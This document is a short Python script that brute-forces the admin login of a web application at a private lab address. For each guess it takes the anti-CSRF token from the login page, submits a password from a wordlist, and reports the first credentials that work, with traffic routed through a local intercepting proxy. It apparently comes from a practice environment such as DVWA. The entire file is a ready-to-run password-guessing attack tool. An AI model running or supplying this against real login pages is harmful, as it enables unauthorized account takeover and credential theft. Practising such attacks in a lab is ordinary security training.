import requests
from bs4 import BeautifulSoup

url = 'http://172.17.0.2/login.php'

def get_token(response):
	soup = BeautifulSoup(response.text, 'html.parser')
	for name in soup.find_all('input'):
		if(name.get('name')=='user_token'):
			return(name.get('value'))

session = requests.Session()
proxies = {
	'http': 'http://127.0.0.1:8080',
	'https': 'http://127.0.0.1:8080'
	}
session.proxies.update(proxies)

with open('passwords.txt', 'r') as f:
	passwords = f.read().splitlines()

for passwd in passwords:
	response = session.get(url)
	user_token=get_token(response)

	payload = {"username":"admin",
		   "password":passwd,
		   "Login":"Login",
		   "user_token":user_token
		}

	login = session.post(url, data=payload)

	if "Login failed" in login.text:
		pass
	elif "CSRF token is incorrect" in login.text:
		print("Invalid CSRF token")
	else:
		print("Correct credentials found\nUsername: ", payload["username"], "\nPassword: ", payload["password"])
